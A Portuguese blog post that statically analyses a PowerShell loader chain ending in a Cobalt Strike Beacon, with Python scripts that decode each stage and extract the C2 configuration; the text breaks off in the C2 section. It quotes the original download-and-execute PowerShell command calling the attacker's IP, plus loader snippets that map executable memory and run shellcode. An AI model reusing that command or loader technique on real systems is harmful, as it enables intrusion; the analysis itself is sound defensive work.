---
title: "Análise estática de um loader multiestágio do Cobalt Strike"
date: 2026-09-10 10:30:00 -0300
categories: [Malware Analysis, Loaders]
tags: [cobalt-strike, powershell, static-analysis]

lang: pt-BR
lang_name: Português
lang_order: 2

translation_key: loader-cobalt-strike

permalink: /ptbr/research/loader-cobalt-strike/
---

{% include language-switcher.html %}

# Loader PowerShell e Cobalt Strike Beacon x86

> **Nota de autoria e uso de IA**
>
> A investigação, identificação dos artefatos, formulação dos achados e a interpretação técnica dos resultados foram realizadas pelo autor. Este relatório contém uso de IA apenas na estruturação, organização, revisão textual e na implementação inicial de scripts Python destinados à extração e à decodificação de dados usados pelo malware. Os scripts, seus resultados e o conteúdo técnico apresentado foram revisados e validados. Algumas explicações técnicas também foram complementadas com IA.
{: .prompt-info }

> **Contexto da análise**
> Este sample foi coletado em 2022, não houve infecção efetiva pois o EDR instalado no computador do usuário conteve a ameaça já no primeiro comando (abaixo). Apesar disso, fui capaz de capturar as etapas posteriores desta execução e fazer a investigação dos artefatos. Dias depois da coleta, o C2 já estava fora do ar.
{: .prompt-tip }

> Alguns achados da investigação ficaram de fora deste relatório a fim de manter os pontos mais relevantes da cadeia de execução deste malware.
{: .prompt-warning }
---


## 1. Resumo

Este relatório apresenta os resultados da análise estática de uma cadeia maliciosa iniciada por um comando PowerShell responsável por baixar e executar um segundo script diretamente em memória.

A primeira detecção ocorreu a partir da seguinte linha de comando:

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://31.41.244[.]192:80/645gkdkfgd'))"
```

O conteúdo disponibilizado pelo endereço remoto consistia em um loader PowerShell contendo um payload codificado em Base64. 

O hash é: `33a7648c64588e855b411fe9bcdb51489d4a33e4ab86705661049bb9b65ceddb`

Este loader utiliza reflexão .NET para resolver APIs nativas, decodifica o Base64 por meio de `CryptStringToBinaryA`, grava o conteúdo em uma região de memória executável e transfere o fluxo de execução para o shellcode resultante.

A análise permitiu reconstruir a seguinte cadeia:

```text
Comando PowerShell inicial
        ↓
Download e execução do loader PowerShell
        ↓
Base64 processado por CryptStringToBinaryA
        ↓
Shellcode x86 inicial
        ↓
Decodificação por ROR
        ↓
Stage 1 — DLL intermediária
        ↓
Resolução de APIs por CRC32
        ↓
Decodificação de payload PE embutido
        ↓
Stage 2 — Cobalt Strike Beacon
        ↓
Configuração decodificada por XOR 0x2E
        ↓
Comunicação HTTP com o C2
```

O estágio final foi identificado como uma DLL x86 compatível com **Cobalt Strike Beacon**, contendo reflective loader, configuração de comunicação HTTP, rotinas de injeção de processo, manipulação de tokens, execução PowerShell e operações com serviços.

A configuração (que foi extraída via script em Python) contém:

```text
C2:       31.41.244.192
Porta:    80
GET:      /push
POST:     /submit.php
Sleep:    60000 ms
Jitter:   0
```

Não foi identificada persistência automática durante o fluxo inicial analisado. Algumas capacidades presentes no Beacon, como criação de serviços e injeção de processos, dependem de comandos posteriormente recebidos do servidor C2 e não devem ser interpretadas como comportamentos executados automaticamente.

---

## 2. Escopo e metodologia

### 2.1 Escopo

O relatório contempla exclusivamente análise estática:

* inspeção do loader PowerShell;
* extração da string Base64;
* análise do shellcode inicial;
* reconstrução dos algoritmos de decodificação;
* extração dos dois estágios PE;
* análise de headers, seções, imports e exports;
* engenharia reversa no IDA;
* resolução de APIs por hash;
* extração da configuração do Beacon;
* identificação de capacidades implementadas.

Não fazem parte deste relatório:

* debugging com x32dbg;
* execução controlada da amostra;
* análise de memória em runtime;
* análise comportamental;
* interação com o C2;
* validação dinâmica de tasking;
* descriptografia completa do protocolo C2.

### 2.2 Ferramentas utilizadas

* <a href="https://hex-rays.com/ida-free" target="_blank" rel="noopener noreferrer">IDA Free</a>;
* <a href="https://detect-it-easy.github.io/" target="_blank" rel="noopener noreferrer">Detect It Easy — DiE</a>;
* <a href="https://github.com/hasherezade/pe-bear" target="_blank" rel="noopener noreferrer">PE-bear</a>;
* <a href="https://cyberchef.io/" target="_blank" rel="noopener noreferrer">CyberChef</a>;
* <a href="https://www.python.org/downloads/" target="_blank" rel="noopener noreferrer">Python 3</a>;
* <a href="https://jupyter.org/" target="_blank" rel="noopener noreferrer">JupyterLab</a>;
* <a href="https://github.com/erocarrera/pefile" target="_blank" rel="noopener noreferrer"><code>pefile</code></a>;
* <a href="https://www.sublimetext.com/" target="_blank" rel="noopener noreferrer">Sublime Text</a>;
* <a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener noreferrer">CobaltStrikeParser</a>;


---

## 3. Visão geral da cadeia de infecção

A cadeia começa com o seguinte comando:

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://31.41.244[.]192:80/645gkdkfgd'))"
```

Os elementos possuem as seguintes funções:

| Elemento         | Função                                     |
| ---------------- | ------------------------------------------ |
| `powershell.exe` | Inicia o interpretador PowerShell          |
| `-nop`           | Impede o carregamento do perfil do usuário |
| `-w hidden`      | Oculta a janela do PowerShell              |
| `-c`             | Executa o comando fornecido                |
| `Net.WebClient`  | Cria um cliente HTTP                       |
| `DownloadString` | Baixa o conteúdo remoto como texto         |
| `IEX`            | Executa o conteúdo baixado como PowerShell |

O endereço remoto entrega o loader PowerShell analisado nas seções a seguir.

---

## 4. Análise do loader PowerShell

### 4.1 Estrutura geral

> Você pode clicar nas imagens para ver mais detalhes em tela cheia.
{: .prompt-tip }
![full script.png](/images/cobalt-strike-loader/full%20script.png)
<center><i>Figura 1 — Loader completo PowerShell contendo resolução dinâmica de APIs e payload Base64 (cortado).</i></center>

Este artefato pode ser baixado no <a href="https://www.virustotal.com/gui/file/33a7648c64588e855b411fe9bcdb51489d4a33e4ab86705661049bb9b65ceddb/detection" target="_blank" rel="noopener noreferrer">Virustotal</a> (conta paga), ou <a href="https://tria.ge/s?q=33a7648c64588e855b411fe9bcdb51489d4a33e4ab86705661049bb9b65ceddb" target="_blank" rel="noopener noreferrer">Triage</a> com uma conta gratuita.

O script inicia com:

```powershell
Set-StrictMode -Version 2
```

Em seguida, define as funções:

```text
func_get_proc
func_get_type
```

A função `func_get_proc` utiliza reflexão .NET para acessar métodos internos relacionados a:

```text
GetModuleHandle
GetProcAddress
```

Isso permite resolver funções nativas sem declarar explicitamente estruturas tradicionais de <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke" target="_blank" rel="noopener noreferrer">P/Invoke (Platform Invoke)</a>.

A função `func_get_type` cria dinamicamente um delegate com `System.Reflection.Emit`. Esse delegate é utilizado para chamar funções nativas a partir dos endereços obtidos por `GetProcAddress`.

O mecanismo permite que o script:

1. localize uma DLL já carregada;
2. resolva uma API pelo nome;
3. construa a assinatura da função;
4. converta o endereço em um delegate;
5. invoque a API diretamente pelo PowerShell.

---

### 4.2 Processamento da string Base64

O shellcode encontra-se armazenado na variável:

```powershell
$var_base64 = '...'
```

O script carrega:

```text
crypt32.dll
```

e resolve a função:

```text
CryptStringToBinaryA
```

A <a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya#:~:text=[in]%20dwFlags" target="_blank" rel="noopener noreferrer">flag</a> utilizada é:

```text
0x1 = CRYPT_STRING_BASE64
```

O processamento ocorre em duas chamadas.

#### Primeira chamada
```powershell
$var_length = 0

$var_result = $var_string_to_binary.Invoke(
    $var_base64,
    $var_base64.Length,
    0x1,
    [IntPtr]::Zero,
    [Ref]$var_length,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)
```

Como o ponteiro destinado a receber os bytes está definido como nulo, a primeira chamada apenas calcula o tamanho necessário para armazenar o conteúdo Base64 decodificado.

#### Criação da região de memória

O script resolve:

```text
CreateFileMappingA
MapViewOfFile
```

e cria uma região mapeada com permissão de leitura, escrita e execução.

O valor utilizado em `CreateFileMappingA` é `0x08000040`, cujo valor inclui:

```text
PAGE_EXECUTE_READWRITE
SEC_COMMIT
```

Em seguida, `MapViewOfFile` retorna o endereço virtual onde o shellcode será gravado.

#### Segunda chamada

```powershell
$var_result = $var_string_to_binary.Invoke(
    $var_base64,
    $var_base64.Length,
    0x1,
    $var_map,
    [Ref]$var_length,
    [IntPtr]::Zero,
    [IntPtr]::Zero
)
```

Dessa vez, o endereço da região mapeada (chamada de $var_map) é fornecido como saída, fazendo com que `CryptStringToBinaryA` grave diretamente os bytes decodificados.

#### Transferência da execução

O endereço da memória é convertido em delegate:

```powershell
$var_invoke =
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $var_map,
        (func_get_type @([IntPtr]) ([Void]))
    )
```

O shellcode é executado com:

```powershell
$var_invoke.Invoke($var_map)
```

O endereço-base do shellcode é também fornecido como argumento para o próprio código.

![7c119fad4d969631b2398403db078882.png](/images/cobalt-strike-loader/7c119fad4d969631b2398403db078882.png)
<center><i>Figura 2 — Primeira chamada para obtenção do tamanho e segunda chamada para gravação dos bytes decodificados.</i></center>

---

### 4.3 Seleção de arquitetura

O script verifica:

```powershell
[IntPtr]::Size
```

Quando executado em um processo de 32 bits, o conteúdo é executado diretamente.

Em processos de 64 bits, o script utiliza:

```powershell
Start-Job -RunAs32
```

Isso indica que o payload foi criado para arquitetura x86.

---

## 5. Extração do shellcode Base64

O script abaixo localiza automaticamente a variável `$var_base64` e grava o conteúdo decodificado em `stage0_shellcode.bin`.

#### Script 1 — Extração do Base64

```python
import base64
import re
from pathlib import Path

INPUT_PS1 = Path("loader.ps1")
OUTPUT_BIN = Path("stage0_shellcode.bin")

text = INPUT_PS1.read_text(
    encoding="utf-8",
    errors="ignore"
)

match = re.search(
    r"\$var_base64\s*=\s*'([^']+)'",
    text,
    flags=re.DOTALL,
)

if not match:
    raise RuntimeError(
        "A variável $var_base64 não foi encontrada."
    )

base64_text = re.sub(
    r"\s+",
    "",
    match.group(1)
)

decoded = base64.b64decode(
    base64_text,
    validate=True
)

OUTPUT_BIN.write_bytes(decoded)

# print("[+] B64 completo: ", base64_text) # Cuidado, string muito grande!

print(f"[+] Arquivo decodificado salvo: {OUTPUT_BIN}")
print(f"[+] Tamanho: {len(decoded)} bytes")
print(f"[+] Primeiros bytes: {decoded[:16].hex(' ')}")
```

O resultado não inicia com a assinatura `4D 5A`, indicando que o conteúdo inicial é shellcode bruto, e não um PE diretamente carregável.

![b71734e2f72461f487b7a227d51d6f08.png](/images/cobalt-strike-loader/b71734e2f72461f487b7a227d51d6f08.png)
<center><i>Figura 3 — Primeiros bytes do shellcode após a remoção da camada Base64.</i></center>

---

## 6. Shellcode inicial e extração do Stage 1

### 6.1 Decoder inicial

O shellcode começa recuperando seu próprio endereço-base:

```nasm
mov eax, [esp+4]
```

Em seguida, acessa endereços internos relativos à base:

```nasm
mov ecx, [eax+9Ch]
mov edx, [eax+0A0h]
lea esi, [eax+0A4h]
```

A interpretação desses campos é:

| Offset | Função                        |
| -----: | ----------------------------- |
| `0x9C` | Endereço da chave       |
| `0xA0` | Endereço onde possui o tamanho da região codificada  |
| `0xA4` | Endereço do início do conteúdo codificado |

O loop de decodificação é:

```nasm
lodsb
and ecx, 7
ror al, cl
inc ecx
stosb
dec edx
jnz decoder_loop
```

O comportamento pode ser representado como:

```c
base = argument;

key  = *(uint32_t *)(base + 0x9C);
size = *(uint32_t *)(base + 0xA0);
data = base + 0xA4;

for (i = 0; i < size; i++) {
    data[i] = ror8(data[i], key & 7);
    key++;
}
```

Ou seja, o código percorre cada byte dos dados e o gira para a direita. A quantidade do giro é obtida por `key & 7`, que simplesmente limita o valor da chave a um número entre **0 e 7**. Depois, a chave aumenta em 1 a cada byte.

A operação é realizada no próprio binário. Após o loop, a região em `base + 0xA4` passa a iniciar com um cabeçalho PE válido.

![8f716c464f5e819fb732b809a2ff5bbd.png](/images/cobalt-strike-loader/8f716c464f5e819fb732b809a2ff5bbd.png)
<center><i>Figura 4 — Disassembly do início do shellcode, contendo o algorítimo ROR</i></center>

![84c9d50b169d5b210c43f05e4100ad56.png](/images/cobalt-strike-loader/84c9d50b169d5b210c43f05e4100ad56.png)
<center><i>Figura 5 — Região onde o stage 1 será decodificado.</i></center>

---

#### Script 2 — Decodificação do Stage 1
O script abaixo faz exatamente o que o shellcode faz, fornece os offsets e em seguida, faz as rotações. Ao fim, salva o arquivo.
```python
from pathlib import Path
import struct

INPUT_FILE = Path("stage0_shellcode.bin")
OUTPUT_FILE = Path("stage1_decoded.bin")

KEY_OFFSET = 0x9C
SIZE_OFFSET = 0xA0
DATA_OFFSET = 0xA4


def ror8(value: int, count: int) -> int:
    value &= 0xFF
    count &= 7

    if count == 0:
        return value

    return (
        (value >> count) |
        (value << (8 - count))
    ) & 0xFF


data = INPUT_FILE.read_bytes()

key = struct.unpack_from(
    "<I",
    data,
    KEY_OFFSET
)[0]

size = struct.unpack_from(
    "<I",
    data,
    SIZE_OFFSET
)[0]

if DATA_OFFSET + size > len(data):
    raise RuntimeError(
        "A região codificada ultrapassa o fim do arquivo."
    )

decoded = bytearray(size)
current_key = key

for i in range(size):
    decoded[i] = ror8(
        data[DATA_OFFSET + i],
        current_key & 7
    )

    current_key = (
        current_key + 1
    ) & 0xFFFFFFFF

if decoded[:2] != b"MZ":
    raise RuntimeError(
        "O resultado não possui assinatura MZ."
    )

OUTPUT_FILE.write_bytes(decoded)

print(f"[+] Chave inicial: 0x{key:08X}")
print(f"[+] Tamanho: 0x{size:X}")
print(f"[+] Arquivo salvo: {OUTPUT_FILE}")
```

---

## 7. Análise do Stage 1

### 7.1 Identificação

| Campo           | Valor                                                              |
| --------------- | ------------------------------------------------------------------ |
| Arquivo         | `stage1_decoded.bin`                                               |
| SHA-256         | `a41dde7d2733cf4f8c057a188fb5bce82f085b7972aeaa23b5ddb0ef71c1988d` |                                            |
| Tipo            | PE32 DLL x86                                                       |
| Nome interno    | `a32big.dll`                                                       |
| ImageBase       | `0x6B680000`                                                       |
| Entry Point RVA | `0x13B0`                                                           |
| Seções          | 9                                                                  |
| Tamanho         | `337920` bytes                                                     |

Os timestamps encontrados no cabeçalho PE devem ser tratados com baixa confiança, pois podem ter sido alterados durante a compilação ou posteriormente.

![5d5a7faf7b90c0589f407f546f3b81eb.png](/images/cobalt-strike-loader/5d5a7faf7b90c0589f407f546f3b81eb.png)
<center><i>Figura 6 — Identificação do formato, arquitetura e compilador do Stage 1.</i></center>

![0078b8528799bd019248805440c5979d.png](/images/cobalt-strike-loader/0078b8528799bd019248805440c5979d.png)
<center><i>Figura 7 — Estrutura PE e distribuição das seções do Stage 1.</i></center>

---

### 7.2 Exports

Os exports identificados incluem:

```text
ARef
DllGetClassObject
DllMain
DllRegisterServer
DllUnregisterServer
Start
```

Os nomes relacionados a COM podem dificultar a identificação imediata da finalidade real da DLL.

---

## 8. Resolução dinâmica de APIs por hash

### 8.1 Objetivo da técnica

O Stage 1 evita armazenar diretamente os nomes de diversas APIs utilizadas.

Em vez de importar todas as funções normalmente, o código:

1. carrega uma DLL com `LoadLibraryW`;
2. localiza sua Export Directory;
3. percorre os nomes exportados;
4. calcula um hash para cada nome;
5. compara o resultado com constantes presentes no binário;
6. chama `GetProcAddress` quando encontra uma correspondência;
7. armazena o endereço resolvido para uso posterior.

Essa técnica reduz a quantidade de informações disponíveis na Import Table e dificulta a identificação automática das capacidades da amostra.

---

### 8.2 Algoritmo identificado

A função resolvedora utiliza um CRC32 refletido com:

```text
Polinômio:  0xEDB88320
Seed:       0xFFFFFFFF
Final XOR:  não observado
Entrada:    nome ASCII da função exportada
```

O pseudocódigo é:

```c
crc = 0xFFFFFFFF;

for each byte in export_name {
    crc ^= byte;

    for (i = 0; i < 8; i++) {
        if (crc & 1)
            crc = (crc >> 1) ^ 0xEDB88320;
        else
            crc >>= 1;
    }
}
```

Este polinômio também é constado num exemplo do <a href="https://en.wikipedia.org/wiki/Computation_of_cyclic_redundancy_checks#:~:text=0xEDB88320" target="_blank" rel="noopener noreferrer">Wikipedia</a>.


A comparação com o valor hardcoded é direta:

```c
if (target_hash == calculated_crc)
```

Quando ocorre uma correspondência, o código chama `GetProcAddress` utilizando o nome da export localizada.

![50016c83fbf6730185f72d351fca417a.png](/images/cobalt-strike-loader/50016c83fbf6730185f72d351fca417a.png)
<center><i>Figura 8 — Implementação do algoritmo CRC32 utilizado na resolução de APIs.</i></center>

![21d6a688edee8ce8bf84020e78b7cbcd.png](/images/cobalt-strike-loader/21d6a688edee8ce8bf84020e78b7cbcd.png)
<center><i>Figura 9 — Lista de chamadas para a função resolvedora dos hashes.</i></center>

---

### 8.3 DLLs processadas

Foram identificados blocos de resolução para:

```text
kernel32.dll
advapi32.dll
ws2_32.dll
wininet.dll
```

No IDA, alguns nomes wide-char foram inicialmente separados incorretamente. Por exemplo `L"a" L"dvapi32.dll"` representavam, em conjunto `L"advapi32.dll"`

A correção da definição como string UTF-16LE permitiu recuperar o nome completo.

---

### 8.4 Reprodução do algoritmo em Python

O seguinte código reproduz o algoritmo do malware:

```python
def malware_crc32_name(name: bytes) -> int:
    crc = 0xFFFFFFFF

    for byte in name:
        crc ^= byte

        for _ in range(8):
            if crc & 1:
                crc = (
                    (crc >> 1) ^ 0xEDB88320
                )
            else:
                crc >>= 1

            crc &= 0xFFFFFFFF

    return crc
```

A função abaixo percorre as exports de uma DLL e procura correspondências:

```python
import pefile
from pathlib import Path


def find_export_by_hash(
    dll_path: Path,
    target_hash: int
):
    pe = pefile.PE(str(dll_path))
    matches = []

    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if not export.name:
            continue

        calculated = malware_crc32_name(
            export.name
        )

        if calculated == target_hash:
            matches.append(
                export.name.decode(
                    "ascii",
                    errors="replace"
                )
            )

    return matches
```

Exemplo de uso:

```python
for target_hash in kernel32_hashes:
    matches = find_export_by_hash(
        kernel32_path,
        target_hash
    )

    print(
        f"0x{target_hash:08X} -> {matches}"
    )
```

![c0737e2729871028e02fff80ffdd3c78.png](/images/cobalt-strike-loader/c0737e2729871028e02fff80ffdd3c78.png)
<center><i>Figura 10 — Reprodução do algoritmo e associação entre hashes e nomes de APIs (JupyterLab).</i></center>

---

### 8.5 APIs relevantes por finalidade

A relação completa de hashes pode conter dezenas de entradas. Para preservar a legibilidade, o corpo principal do relatório apresenta somente grupos relevantes.

| DLL            | Exemplos de APIs resolvidas                                                                                                                                                     | Finalidade                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| `kernel32.dll` | `CreateFileA/W`, `CreateFileMappingA/W`, `MapViewOfFile`, `CreateNamedPipe`, `ConnectNamedPipe`, `CloseHandle`, `OpenProcess`, `VirtualAlloc`, `VirtualProtect`, `CreateThread` | Arquivos, memória, processos, threads e named pipes |
| `ws2_32.dll`   | `WSAStartup`, `socket`, `connect`, `send`, `recv`, `closesocket`                                                                                                                | Comunicação por sockets                             |
| `wininet.dll`  | `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, `InternetCloseHandle`                                                          | Comunicação HTTP com o C2                           |
| `advapi32.dll` | `OpenSCManagerA/W`, `CreateServiceA/W`, `StartServiceA/W`, `DeleteService`, `CloseServiceHandle`                                                                                | Operações com serviços                              |


Uma API resolvida não representa necessariamente uma API executada.

| Evidência                | Conclusão permitida                  |
| ------------------------ | ------------------------------------ |
| Hash resolvido           | API disponível ao código             |
| XREF para o ponteiro     | API referenciada por uma rotina      |
| Call site identificado   | Capacidade implementada              |
| Argumentos compreendidos | Finalidade provável ou confirmada    |
| Execução observada       | Comportamento efetivamente realizado |

<span id="ref-appendix-d"></span>
> O mapeamento completo `hash → API` pode ser consultado no [Apêndice D](#appendix-d).
{: .prompt-info }


---

## 9. Controle de processos e anti-analysis

Foi identificada uma rotina que enumera os processos em execução e recupera informações sobre o processo pai do processo hospedeiro.

A função auxiliar utiliza `CreateToolhelp32Snapshot`, `Process32FirstW` e `Process32NextW` para localizar a estrutura `PROCESSENTRY32W` correspondente a um PID fornecido. No fluxo chamador, o campo `th32ParentProcessID` da entrada do processo atual é utilizado para recuperar a entrada do processo pai.

A rotina:

* obtém a entrada correspondente ao processo atual;
* extrai seu `th32ParentProcessID`;
* localiza o processo pai no snapshot;
* verifica se o nome do pai contém `powershell.exe`;
* consulta também o processo pai dessa entrada, isto é, uma geração adicional da linhagem;
* verifica se esse ancestral contém `powershell.exe`;
* abre os processos selecionados com a máscara de acesso `0x401`;
* chama `TerminateProcess` quando `OpenProcess` retorna um handle válido;
* ao final, tenta encerrar o processo pai imediato independentemente da correspondência com `powershell.exe`.

O acesso solicitado em `OpenProcess` inclui `PROCESS_TERMINATE` e `PROCESS_QUERY_INFORMATION` (<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights#:~:text=PROCESS_TERMINATE%20(0x0001)&amp;text=PROCESS_QUERY_INFORMATION%20(0x0400)" target="_blank" rel="noopener noreferrer">0x401</a>)

A rotina pode remover o launcher original e interferir em ferramentas que tenham iniciado o PowerShell como processo-filho.

A classificação mais adequada aqui pode ser "Limpeza ou evasão da árvore de processos com efeito anti-debug"

Não foram observadas comparações explícitas com nomes como:

```text
x32dbg.exe
ollydbg.exe
windbg.exe
```

![851c3af58fdaa819570f8e817f5cba8d.png](/images/cobalt-strike-loader/851c3af58fdaa819570f8e817f5cba8d.png)
<center><i>Figura 11 — Uso de Toolhelp para localizar o processo pai.</i></center>

![f549f4b89ca7a7a8c0587bc62f49e83a.png](/images/cobalt-strike-loader/f549f4b89ca7a7a8c0587bc62f49e83a.png)
<center><i>Figura 12 — Rotina responsável por encerrar processos ancestrais.</i></center>

---

## 10. Extração do Stage 2

A seção `.data` do Stage 1 chama atenção pois é muito grande, levantando uma suspeita de que haja mais dados a serem decodificados ali.
![424a05e40b22bb59439bb939d853bb91.png](/images/cobalt-strike-loader/424a05e40b22bb59439bb939d853bb91.png)
<center><i>Figura 13 - Tamanho da seção .data do Stage 1</i></center>

E ao investigar o início dessa seção, foi possível identificar alguns bytes interessantes:
![da27f22a433f4bbebf3d839fb2983e98.png](/images/cobalt-strike-loader/da27f22a433f4bbebf3d839fb2983e98.png)
<center><i>Figura 14 -  Bytes iniciais de .data</i></center>

Os itens marcados mostram bytes referente a "tamanho" (similiarmente ao buscado no shellcode no início da cadeia) e um amontado grande de bytes em seguida.

| Campo            |        Valor |
| ---------------- | -----------: |
| VA codificado    | `0x6B68F054` |
| RVA              |     `0xF054` |
| Tamanho          |    `0x33800` |

 Ao buscar referências de onde esse array é usado, foi possível verificar uma função extratora.
![ce242b5d01762f9c1b79ebc4ecd2d593.png](/images/cobalt-strike-loader/ce242b5d01762f9c1b79ebc4ecd2d593.png)
<center><i>Figura 15 - Função extratora do Stage 2</i></center>

O algoritmo utilizado para recuperar o Stage 2 é conceitualmente semelhante ao observado na decodificação do Stage 1. Com a diferença que esse extrator não usa chave, a contagem inicial é fixada em 1

O código:

1. aloca uma região de memória;
2. percorre `0x33800` bytes;
3. aplica `ROR` com contagem variável;
4. grava o resultado;
5. transfere execução para o conteúdo decodificado.

---

#### Script 3 — Extração do Stage 2

```python
from pathlib import Path

import pefile

INPUT_FILE = Path("stage1_decoded.bin")
OUTPUT_FILE = Path("stage2_decoded.bin")

ENCODED_VA = 0x6B68F054
ENCODED_SIZE = 0x33800
INITIAL_COUNT = 1


def ror8(value: int, count: int) -> int:
    value &= 0xFF
    count &= 7

    if count == 0:
        return value

    return (
        (value >> count) |
        (value << (8 - count))
    ) & 0xFF


data = INPUT_FILE.read_bytes()
pe = pefile.PE(str(INPUT_FILE))

rva = (
    ENCODED_VA -
    pe.OPTIONAL_HEADER.ImageBase
)

file_offset = pe.get_offset_from_rva(rva)

if file_offset + ENCODED_SIZE > len(data):
    raise RuntimeError(
        "A região codificada ultrapassa o fim do arquivo."
    )

decoded = bytes(
    ror8(
        data[file_offset + i],
        (INITIAL_COUNT + i) & 7
    )
    for i in range(ENCODED_SIZE)
)

if decoded[:2] != b"MZ":
    raise RuntimeError(
        "O resultado não possui assinatura MZ."
    )

OUTPUT_FILE.write_bytes(decoded)

print(f"[+] RVA: 0x{rva:X}")
print(f"[+] File offset: 0x{file_offset:X}")
print(f"[+] Tamanho: 0x{len(decoded):X}")
print(f"[+] Arquivo salvo: {OUTPUT_FILE}")
```

Para consolidar a análise até aqui, o Stage 1:

1) É uma DLL identificada internamente como `a32big.dll`.

2) Atua como loader para o estágio seguinte.

3) Contém rotinas de resolução dinâmica de APIs.

4) Decodifica o Stage 2 com ROR.

---

## 11. Análise do Stage 2

### 11.1 Identificação

| Campo           | Valor                                                              |
| --------------- | ------------------------------------------------------------------ |
| Arquivo         | `stage2_decoded.bin`                                               |
| SHA-256         | `6318e322c478adefa9b4a16166c3d05201153b5cbd1f2e21327300abdeb5a757` |                                          |
| Tipo            | PE32 DLL x86                                                       |
| Nome interno    | `beacon.dll`                                                       |
| Export          | `_ReflectiveLoader@4`                                              |
| ImageBase       | `0x10000000`                                                       |
| Entry Point RVA | `0x1627A`                                                          |
| Seções          | 4                                                                  |
| Tamanho         | `210944` bytes                                                     |

A presença de:

```text
beacon.dll
_ReflectiveLoader@4
```

combinada com a estrutura da configuração e as capacidades identificadas é compatível com um **Cobalt Strike Beacon x86**.

![fad32249832fc21120271f0cff6967c4.png](/images/cobalt-strike-loader/fad32249832fc21120271f0cff6967c4.png)
<center><i>Figura 16 — Identificação do Stage 2 como DLL x86 no DiE.</i></center>

![b6aaea5b138fd42d2ed0cc1880a9e4b5.png](/images/cobalt-strike-loader/b6aaea5b138fd42d2ed0cc1880a9e4b5.png)
<center><i>Figura 17 — Export _ReflectiveLoader@4 e estrutura PE do Beacon.</i></center>

---

## 12. Decodificação da configuração do Beacon/C2

Foi identificado uma função que realiza operação XOR em array de `4096` bytes em:

```text
VA:  0x10032020
RVA: 0x32020
```
![6706352e5972d228b64cb9847ad7b87b.png](/images/cobalt-strike-loader/6706352e5972d228b64cb9847ad7b87b.png)
<center><i>Figura 18 — Bloco de configuração codificado na seção de dados.</i></center>

A primeira rotina que utiliza o array executa:

```c
for (i = 0; i < 4096; i++)
    array[i] ^= 0x2E;
```
Portanto, se faz necessário mais um script python para fazer a mesma decodificação que o malware faz.

---

#### Script 4 — Extração da configuração

```python
import re
from pathlib import Path

import pefile

INPUT_FILE = Path("stage2_decoded.bin")
OUTPUT_FILE = Path("config_decoded.bin")

CONFIG_VA = 0x10032020
CONFIG_SIZE = 0x1000
XOR_KEY = 0x2E

# Quantidade mínima de caracteres para considerar uma sequência como string.
MIN_STRING_LENGTH = 3

{% raw %}
def extract_ascii_strings(
    data: bytes,
    minimum_length: int = 3,
) -> list[str]:
    pattern = rb"[\x20-\x7E]{%d,}" % minimum_length

    return [
        match.decode("ascii")
        for match in re.findall(pattern, data)
    ]
{% endraw %}

data = INPUT_FILE.read_bytes()
pe = pefile.PE(str(INPUT_FILE))

rva = (
    CONFIG_VA -
    pe.OPTIONAL_HEADER.ImageBase
)

file_offset = pe.get_offset_from_rva(rva)

if file_offset + CONFIG_SIZE > len(data):
    raise RuntimeError(
        "A configuração ultrapassa o fim do arquivo."
    )

encoded = data[
    file_offset:
    file_offset + CONFIG_SIZE
]

decoded = bytes(
    byte ^ XOR_KEY
    for byte in encoded
)

OUTPUT_FILE.write_bytes(decoded)

print(f"[+] Config RVA: 0x{rva:X}")
print(f"[+] File offset: 0x{file_offset:X}")
print(f"[+] Arquivo salvo: {OUTPUT_FILE}")

ascii_strings = extract_ascii_strings(
    decoded,
    MIN_STRING_LENGTH,
)

print("\n[+] Strings ASCII encontradas:")

if ascii_strings:
    for string in ascii_strings:
        print(f"    {string}")
else:
    print("    Nenhuma string ASCII encontrada.")

```

O resultado é uma estrutura binária e não uma única string. Por isso, foi encontrado:

* bytes nulos;
* IDs de campos;
* tipos;
* tamanhos;
* inteiros;
* strings;
* buffers binários.

Por legibilidade, foi optado filtrar o resultado por strings de tamanho mínimo 3:

![5cf4492f05baf0cea095f472a08ebf03.png](/images/cobalt-strike-loader/5cf4492f05baf0cea095f472a08ebf03.png)
<center><i>Figura 19 — Strings e parâmetros visíveis após o XOR 0x2E (filtrada com strings de tamanho mínimo 3).</i></center>

---

## 13. Configuração extraída
Com o intuito de entender ainda mais sobre a configuração do beacon, foi usado o  projeto <a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener noreferrer">CobaltStrikeParser</a>, que tenta ir além das strings legíveis. Ao passar o `config_decoded.bin` como argumento, o script trouxe mais alguns detalhes (lista filtrada):

| Campo              | Valor                                                             |
| ------------------ | ----------------------------------------------------------------- |
| Protocolo          | HTTP                                                              |
| C2                 | `31.41.244.192`                                                   |
| Porta              | `80`                                                              |
| Sleep              | `60000 ms`                                                        |
| Jitter             | `0`                                                               |
| URI GET            | `/push`                                                           |
| URI POST           | `/submit.php`                                                     |
| Verbo GET          | `GET`                                                             |
| Verbo POST         | `POST`                                                            |
| User-Agent         | `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)` |
| Header de metadata | `Cookie`                                                          |
| Content-Type       | `application/octet-stream`                                        |
| Spawn-to x86       | `%windir%\syswow64\rundll32.exe`                                  |
| Spawn-to x64       | `%windir%\sysnative\rundll32.exe`                                 |
| Watermark          | `1580103824`                                                      |
|ProcInject_Execute |`CreateThread`, `SetThreadContext`, `CreateRemoteThread`, `RtlCreateUserThread`|
|ProcInject_AllocationMethod|`VirtualAllocEx`|

---

## 14. Comunicação C2

O Stage 2 utiliza APIs da `WININET.dll` compatíveis com:

```text
InternetOpenA
InternetConnectA
HttpOpenRequestA
HttpSendRequestA
InternetQueryDataAvailable
InternetReadFile
InternetCloseHandle
```

O fluxo pode ser resumido como:

```text
InternetOpenA(User-Agent)
        ↓
InternetConnectA(31.41.244.192, 80)
        ↓
